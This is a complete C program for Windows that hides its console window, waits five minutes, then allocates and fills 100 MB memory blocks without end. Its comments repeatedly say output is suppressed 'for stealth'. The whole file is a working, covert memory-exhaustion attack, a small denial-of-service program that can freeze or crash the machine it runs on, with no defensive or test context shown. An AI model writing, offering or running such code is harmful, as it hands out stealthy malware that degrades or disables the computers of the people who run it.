#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define CHUNK_SIZE (100 * 1024 * 1024)  // 100MB chunks
#define DELAY_MS (5 * 60 * 1000)        // 5 minutes in milliseconds

int main() {
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);  // Hide the console immediately

    // Delay for 5 minutes
    Sleep(DELAY_MS);

    size_t total_allocated = 0;    // Track total memory allocated in bytes
    void **chunks = NULL;          // Array to store pointers to allocated chunks
    size_t chunk_count = 0;        // Number of chunks allocated
    size_t attempts = 0;           // Count allocation attempts

    // No printf here since console is hidden, but you could log to a file if desired
    // For stealth, we skip console output entirely

    while (1) {
        attempts++;
        // Allocate a 100MB chunk
        void *chunk = malloc(CHUNK_SIZE);
        if (chunk) {
            // Fill the chunk with data to ensure it’s committed
            memset(chunk, 69, CHUNK_SIZE);
            total_allocated += CHUNK_SIZE;

            // Store the pointer in an array
            void **temp = realloc(chunks, (chunk_count + 1) * sizeof(void*));
            if (temp) {
                chunks = temp;
                chunks[chunk_count] = chunk;
                chunk_count++;
            }

            // Periodically write to a random chunk to keep memory in the working set
            if (chunk_count > 0) {
                size_t idx = rand() % chunk_count;
                memset(chunks[idx], 42, CHUNK_SIZE);
            }
        }
        // No failure output to maintain stealth
    }

    // Unreachable due to infinite loop, but included for completeness
    for (size_t i = 0; i < chunk_count; i++) {
        free(chunks[i]);
    }
    free(chunks);
    return 0;
}
